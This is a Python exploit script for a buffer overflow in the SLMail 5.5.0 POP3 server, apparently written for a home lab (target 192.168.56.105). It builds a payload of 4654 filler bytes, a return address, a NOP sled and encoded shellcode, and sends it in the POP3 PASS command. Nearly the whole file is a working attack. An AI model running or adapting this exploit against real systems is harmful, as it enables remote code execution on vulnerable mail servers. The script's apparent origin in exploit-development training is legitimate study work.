#!/usr/bin/env python3

# 
# Exploits buffer overflow for SLMail-5.5.0 over POP3 protocol
#
# Author: Devin Trejo
# Date: 20160504

import socket, sys, os, struct
import argparse

def main(argv):
    # Client machine IPv4 address
    clientIP = "192.168.56.105"
    clinetPORT = 110

    # Parse for verbose information
    parser = argparse.ArgumentParser(prog="SLMail Buffer Overflow")
    parser.add_argument('--fuzz', '-f', action='store_true', default=False,
        help='run password fuzzer')
    parser.add_argument('--crash', '-c', action='store_true', default=False,
        help='crash program')

    # Parse args for user input
    args = parser.parse_args()

    # Run appropriate functions
    if args.crash == True:
        return crash(clientIP, clinetPORT)   

    return 0

def crash(clientIP, clinetPORT):
    # Declare a acceptable buffer size that fits into TCP Packet
    BUFFER_SIZE = 1024

    # Exploit Code
    sc = b"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
    sc += b"\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
    sc += b"\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
    sc += b"\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
    sc += b"\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
    sc += b"\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
    sc += b"\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
    sc += b"\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
    sc += b"\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
    sc += b"\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
    sc += b"\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
    sc += b"\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
    sc += b"\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
    sc += b"\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
    sc += b"\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
    sc += b"\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
    sc += b"\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
    sc += b"\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
    sc += b"\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
    sc += b"\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
    sc += b"\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
    sc += b"\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
    sc += b"\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
    sc += b"\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
    sc += b"\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"

    # Create our payload
    exploit = b'\x41' * 4654 + struct.pack('<L', 0x750362c3) + \
        b'\x90'*32 + sc

    # Define Static user-name to pass into POP3 protocol USER prompt
    USER = "user"

    # Try to connect to passed IP
    try:
        # Create a new socket to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((clientIP, clinetPORT))
    except Exception as e:
        print("Connection could not be made to server.")
        print("Exception: " + str(e) + "\n\n")
        s.close()
        return -1

    # Print for debug to console the length of password buffer
    print("Connection to POP3 Server Successful!")

    # Send server username
    s.send(bytes("USER " + USER + "\r\n", 'UTF-8'))
    
    # Wait to receive a message
    data = s.recv(BUFFER_SIZE)
    data =  bytes.decode(data, 'UTF-8')
    print("Received data after USER input: \n" + data)

    # Send server password (with long string of A times i)
    s.send(bytes("PASS ", 'UTF-8') + exploit + \
        bytes("\r\n", "UTF-8"))

    # Wait to receive a message
    data = s.recv(BUFFER_SIZE)
    data =  bytes.decode(data, 'UTF-8')
    print("Received data after PASS input: \n" + data)
    
    # Reset connection for next iteration
    print("Connection to server closed.\n" +
            "-"*75 + "\n")
    s.close()
    return 0

# Run main if this is ran as main function. 
if __name__ == "__main__":
    main(sys.argv)
